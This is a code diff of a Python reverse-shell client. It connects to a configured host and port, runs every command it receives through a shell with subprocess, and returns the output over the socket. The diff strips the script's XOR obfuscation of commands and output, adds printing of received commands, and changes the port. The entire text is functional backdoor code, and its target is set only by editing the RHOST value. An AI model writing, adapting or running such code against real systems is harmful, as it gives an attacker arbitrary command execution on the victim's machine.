@@ -1,5 +1,5 @@
 import socket
-import argparse
+# import argparse
 import subprocess
 import pyfiglet
 import os
@@ -13,28 +13,21 @@ def main():
     print ('\033[0m')
     # Configuring the script to connect to the remote culprit system
     RHOST='localhost'
-    RPORT=8000
+    RPORT=8006
     # Establihing connection with the remote system
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((RHOST,RPORT))
     # Receiving commands from the remote system
     while True:
         data=s.recv(1024)
-        command=bytearray(data)
-        #  Decoding the command received
-        for i in range(len(command)):
-            command[i]=command[i]^0x41
+        print("Received command is:",data)
         # Executing the output using the subprocess lib
-        comm=subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        STDOUT, STDIN=comm.communicate()
-
-        # Encoding the result to be sent over the socket
-        res=bytearray(STDOUT)
-        for i in range(len(res)):
-            res[i]^=0x41
+        comm=subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        res1,res2=comm.communicate()
+        res=res1.decode()+'~'+res2.decode()
         # Sending the encoded data over the sockets
-        s.send(str(res))
-        s.close()
+        s.send(res.encode())
+        # s.close()
 
 if __name__ == '__main__':
     main()
